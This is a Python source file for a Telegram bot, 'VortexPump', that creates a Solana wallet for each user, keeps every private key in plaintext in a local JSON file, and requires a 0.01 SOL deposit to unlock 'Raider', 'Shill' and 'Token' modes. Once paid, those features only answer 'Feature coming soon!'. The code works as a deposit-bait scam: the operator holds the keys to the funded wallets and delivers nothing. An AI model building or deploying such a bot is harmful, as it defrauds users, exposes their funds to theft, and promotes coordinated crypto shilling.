import os
import json
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from solana.keypair import Keypair
from solana.rpc.api import Client as SolanaClient
import base58

# Replace with your Telegram bot token
BOT_TOKEN = "YOUR_BOT_TOKEN"

# Solana RPC URL
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"
solana_client = SolanaClient(SOLANA_RPC_URL)

# JSON storage file
DATA_FILE = "users.json"

# Load user data from JSON file
def load_users():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {}

# Save user data to JSON file
def save_users():
    with open(DATA_FILE, "w") as f:
        json.dump(users, f, indent=4)

# Initialize bot and users data
bot = Client("VortexPump", bot_token=BOT_TOKEN)
users = load_users()

# Generate a Solana wallet
def generate_solana_wallet():
    keypair = Keypair()
    sol_address = str(keypair.public_key)
    private_key = base58.b58encode(keypair.secret_key).decode()
    return sol_address, private_key

# Start command - Welcome new users and create wallet
@bot.on_message(filters.command("start"))
def start(client, message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name

    if user_id not in users:
        sol_address, private_key = generate_solana_wallet()
        users[user_id] = {
            "username": username,
            "sol_address": sol_address,
            "private_key": private_key,
            "balance": 0.0
        }
        save_users()

        message.reply_text(
            f"🎉 Welcome, {username}! Your Solana wallet has been created.\n\n"
            f"🔹 **Solana Address:** `{sol_address}`\n"
            f"🔒 **Private Key:** Sent in DM (NEVER SHARE IT!)",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Check Wallet", callback_data="wallet")]
            ])
        )
        # Send private key in DM
        client.send_message(user_id, f"🔑 Your private key: `{private_key}` (Keep it safe!)")
    else:
        message.reply_text(
            f"👋 Welcome back, {username}! Your wallet is ready.\nUse the buttons below.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Check Wallet", callback_data="wallet")]
            ])
        )

# Check Wallet Balance
@bot.on_callback_query(filters.regex("wallet"))
def wallet(client, callback_query):
    user_id = str(callback_query.from_user.id)

    if user_id in users:
        sol_address = users[user_id]["sol_address"]
        balance = users[user_id]["balance"]

        callback_query.message.edit_text(
            f"🏦 **Your Wallet**\n\n"
            f"🔹 **Address:** `{sol_address}`\n"
            f"💰 **Balance:** {balance} SOL\n\n"
            "⚡ Fund your wallet to unlock features!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit", callback_data="deposit")]
            ])
        )
    else:
        callback_query.message.edit_text("❌ No wallet found. Use /start to create one.")

# Deposit Instructions
@bot.on_callback_query(filters.regex("deposit"))
def deposit(client, callback_query):
    user_id = str(callback_query.from_user.id)

    if user_id in users:
        sol_address = users[user_id]["sol_address"]
        callback_query.message.edit_text(
            f"🔹 Send at least **0.01 SOL** to this address to unlock features:\n\n"
            f"`{sol_address}`\n\n"
            "🚀 After deposit, click the button below to refresh.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Check Balance", callback_data="check_balance")]
            ])
        )

# Check Solana Balance
@bot.on_callback_query(filters.regex("check_balance"))
def check_balance(client, callback_query):
    user_id = str(callback_query.from_user.id)

    if user_id in users:
        sol_address = users[user_id]["sol_address"]
        balance = solana_client.get_balance(sol_address)["result"]["value"] / 1e9  # Convert lamports to SOL

        users[user_id]["balance"] = balance  # Update balance in JSON
        save_users()

        if balance >= 0.01:
            callback_query.message.edit_text(
                f"✅ Deposit received! Balance: {balance} SOL\n\n"
                "🎉 You now have access to all features!",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Raider Mode", callback_data="raid")],
                    [InlineKeyboardButton("Shill Mode", callback_data="shill")],
                    [InlineKeyboardButton("Token Mode", callback_data="token")],
                    [InlineKeyboardButton("Wallet", callback_data="wallet")],
                    [InlineKeyboardButton("Refer", callback_data="refer")]
                ])
            )
        else:
            callback_query.message.edit_text(
                f"⚠️ Deposit not received or insufficient (Balance: {balance} SOL)\n\n"
                "🔹 Send at least **0.01 SOL** to unlock features."
            )

# Locked features until deposit is made
@bot.on_callback_query(filters.regex("raid|shill|token|refer"))
def locked_features(client, callback_query):
    user_id = str(callback_query.from_user.id)

    if users.get(user_id, {}).get("balance", 0.0) >= 0.01:
        callback_query.message.edit_text("🚀 Feature coming soon!")
    else:
        callback_query.message.edit_text("❌ You need to deposit at least **0.01 SOL** to unlock this feature!")

# Help command
@bot.on_message(filters.command("help"))
def help_command(client, message):
    message.reply_text(
        "**Vortex Pump Bot Commands**\n\n"
        "🚀 /start - Create a Solana wallet\n"
        "🏦 /wallet - Check your wallet balance\n"
        "🎁 /refer - Get your referral link\n"
        "🔥 /shill - Activate Shill Mode\n"
        "💎 /raid - Activate Raider Mode\n"
        "📊 /token - Token-related info\n"
        "⚙️ /settings - Customize your bot settings\n"
        "❓ /support - Get help or contact admin"
    )

# Run the bot
bot.run()
